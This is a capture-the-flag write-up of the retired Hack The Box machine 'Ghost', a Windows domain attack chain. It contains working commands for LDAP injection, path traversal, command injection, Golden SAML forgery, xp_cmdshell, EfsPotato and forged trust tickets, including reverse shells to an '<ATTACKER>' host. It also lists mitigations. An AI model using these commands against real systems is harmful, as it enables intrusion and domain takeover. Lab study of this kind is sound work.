---
machine: Ghost
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, active-directory, ldap, adfs, golden-saml, kerberos, mssql, privesc]
---

# Ghost — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Ghost is a DC with a Linux side host publishing a Ghost blog and a Next.js intranet. The intranet authenticates over LDAP and is vulnerable to LDAP injection: `*` logs in as `kathryn.holland`. Inside, Gitea and a source repository are found: the blog has a file read in `extra` and the intranet has command injection in `/api-dev/scan`, guarded by `X-DEV-INTRANET-KEY`. Read `/proc/self/environ` for the key, execute as root in the container and reuse a multiplexed SSH socket to enter `LINUX-DEV-WS01` as `florence.ramirez`. Extract their TGT, add a `bitbucket` DNS record to capture `justin.bradley`'s NetNTLMv2, crack it and get WinRM. `justin.bradley` can read the gMSA password of `adfs_gmsa$`; with that account, dump ADFS signing material and forge Golden SAML as `Administrator`. The SQL portal allows `OPENQUERY` to `PRIMARY`, impersonate `sa`, enable `xp_cmdshell` and get `mssqlserver`; `EfsPotato` gives SYSTEM. As a DC of `corp.ghost.htb` with a bidirectional trust, a forged trust ticket or a Golden Ticket with Enterprise Admins reads the final flag on `DC01`.

## Recon

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389 <IP>
```

- DC `DC01.ghost.htb`, domain `ghost.htb`, Windows Server 2022.
- `8008` nginx/Ubuntu with Ghost 5.78 and `intranet.ghost.htb` (Next.js).
- `8443` Ghost Core, SAML login against `federation.ghost.htb`.
- `1433` MSSQL 2022; `5985` WinRM; `3389` RDP.

```text
10.10.11.24 DC01 DC01.ghost.htb ghost.htb intranet.ghost.htb \
  gitea.ghost.htb federation.ghost.htb
```

## Enumeration

`intranet.ghost.htb` uses LDAP. The form submits `ldap-username` and `ldap-secret`; sending `*` for both authenticates as `kathryn.holland`. The panel lists users and groups, mentions a Gitea-to-Bitbucket migration and `gitea_temp_principal`.

```bash
kerbrute userenum -d ghost.htb users.txt --dc dc01.ghost.htb
```

The blog exposes `/ghost/api/content/posts/?key=<KEY>`. The `ghost-dev/blog` repo contains a modified `posts-public.js`: if `extra` is supplied, it reads `/var/lib/ghost/extra/<extra>` without sanitising. The `gohst-dev/intranet` repo contains the Next.js frontend and Rust backend with `/scan`, which runs `bash -c "intranet_url_check <url>"`.

## Foothold

The LDAP injection allows prefix password brute force: send `<prefix>*` and a 303 confirms the character. This recovers `gitea_temp_principal`'s password.

The blog file read allows traversal:

```bash
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=<KEY>&extra=../../../../etc/passwd' -s \
  | jq -r '.meta.extra["../../../../etc/passwd"]'
```

Read `/proc/self/environ` to get `DEV_INTRANET_KEY`. Call the intranet endpoint with it:

```bash
curl http://intranet.ghost.htb:8008/api-dev/scan \
  -H 'Content-Type: application/json' \
  -H 'X-DEV-INTRANET-KEY: <KEY>' \
  -d '{"url":"http://<ATTACKER>/; id"}'
```

`id`'s output returns in `temp_command_stdout` as `uid=0(root)`. Replace it with a bash reverse shell to get root in the container.

## Lateral movement

The container has `docker-entrypoint.sh`, which sets up SSH multiplexing under `/root/.ssh/controlmaster`. A persistent socket exists as `florence.ramirez@ghost.htb@dev-workstation:22`; reuse it without credentials:

```bash
ssh -o ControlPath=/root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 \
  florence.ramirez@ghost.htb@dev-workstation
```

On `LINUX-DEV-WS01`, `klist` shows a TGT in `/tmp/krb5cc_50`. Copy it as base64, decode it on the attacker host and use it with `KRB5CCNAME`:

```bash
KRB5CCNAME=florence.ramirez.krb5cc netexec smb ghost.htb --use-kcache
```

`justin.bradley` complains that his Bitbucket script fails because DNS is missing. Any domain user can create DNS records; add `bitbucket.ghost.htb` pointing at the attacker and Responder captures the NetNTLMv2:

```bash
python dnstool.py -u 'ghost.htb\florence.ramirez' -k -a add -r bitbucket \
  --zone ghost.htb --data <ATTACKER> -dns-ip <IP> DC01.ghost.htb
hashcat -m 5600 justin.netntlmv2 rockyou.txt
```

The cracked password works over WinRM and yields `user.txt`.

## Privilege escalation

`justin.bradley` can read the gMSA password of `adfs_gmsa$`, which also has WinRM:

```bash
netexec ldap dc01.ghost.htb -u justin.bradley -p '<PASSWORD>' --gmsa
evil-winrm -i dc01.ghost.htb -u 'adfs_gmsa$' -H '<NTLM>'
```

Run `ADFSDump.exe` to get the private key, encrypted signing key, issuer and the `core.ghost.htb:8443` relying party. Use `ADFSpoof.py` to forge a `SAMLResponse` as `Administrator@ghost.htb` and POST it to `/adfs/saml/postResponse`; the resulting cookie opens the SQL portal.

The portal connects as `web_client` and has a `PRIMARY` linked server. `OPENQUERY` executes there; `bridge_corp` can impersonate `sa`:

```sql
EXECUTE('EXECUTE AS LOGIN=''sa''; exec sp_configure "show advanced options",1; reconfigure;') AT [PRIMARY]
EXECUTE('EXECUTE AS LOGIN=''sa''; exec sp_configure "xp_cmdshell",1; reconfigure;') AT [PRIMARY]
EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell "whoami"') AT [PRIMARY]
```

Download `nc64.exe` and launch a reverse shell as `NT SERVICE\MSSQLSERVER`. That service has `SeImpersonate`; Defender blocks GodPotato, so compile `EfsPotato.cs` with `csc.exe` and run it:

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
.\EfsPotato.exe '\programdata\nc64.exe <ATTACKER> 444 -e powershell'
```

The shell is `nt authority\system` on `PRIMARY`, DC of `corp.ghost.htb`.

### Crossing the trust

`PRIMARY` is the `corp.ghost.htb` DC, with a bidirectional within-forest trust to `ghost.htb`. With SYSTEM, dump the `GHOST$` trust account hash and the domain SID, then forge an interdomain ticket:

```bash
ticketer.py -nthash <TRUST_HASH> \
  -domain-sid <CORP_SID> -domain corp.ghost.htb \
  -extra-sid <GHOST_ENTERPRISE_ADMINS_SID> \
  -spn krbtgt/ghost.htb 0xdf
getST.py -k -no-pass -spn cifs/dc01.ghost.htb corp.ghost.htb/0xdf@ghost.htb
```

With the service ticket, access `DC01`'s `C$` and read `root.txt`. Alternative: a Golden Ticket with the `corp.ghost.htb` `krbtgt` hash and `/sids:<GHOST_ENTERPRISE_ADMINS_SID>`.

## Evidence

- LDAP login with `*` as `kathryn.holland`.
- `gitea_temp_principal` password recovered by prefix.
- `extra=../../../../etc/passwd` and `DEV_INTRANET_KEY` from `/proc/self/environ`.
- `id` as root in `temp_command_stdout`.
- Multiplexed SSH socket and `florence.ramirez`'s TGT.
- `bitbucket` DNS record and `justin.bradley`'s NetNTLMv2 hash.
- `adfs_gmsa$` gMSA, `ADFSDump` and Golden SAML.
- `OPENQUERY`, `xp_cmdshell`, `EfsPotato` and SYSTEM on `PRIMARY`.
- Trust ticket and `root.txt` read on `DC01`.

## Lessons learned

- LDAP injection in a login enables bypass and prefix-based attribute extraction.
- Internal repositories expose contracts, keys and backend vulnerabilities.
- File reads over `/proc/self/environ` leak process secrets.
- SSH multiplexing reuses authentications and bypasses access controls.
- Any domain user can create DNS records; Responder turns that into credentials.
- ADFS without protection of its signing material allows forging arbitrary identities.
- A linked server with `IMPERSONATE` and `xp_cmdshell` leads from SQL to RCE.
- Within-forest trusts allow reusing Enterprise Admins SIDs.

## Mitigations and detection

- Parameterise LDAP searches and reject metacharacters in the login.
- Do not store secrets in process environment variables readable through file reads.
- Review plugin and internal API code; validate paths and commands.
- Disable user-created DNS records and enable LDAP signing/channel binding.
- Protect ADFS keys, rotate compromised material and monitor `ADFSDump` and anomalous SAML.
- Restrict `IMPERSONATE`, `xp_cmdshell` and linked servers; segregate the SQL account.
- Audit trusts, forged tickets and `C$` access across domains.

## References

- [0xdf — Ghost](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html)
- [IppSec — Ghost](https://www.youtube.com/watch?v=4dEmocjKnZg)
- [Hack The Box — Ghost](https://app.hackthebox.com/machines/ghost)
- [Microsoft — ADFS](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview)
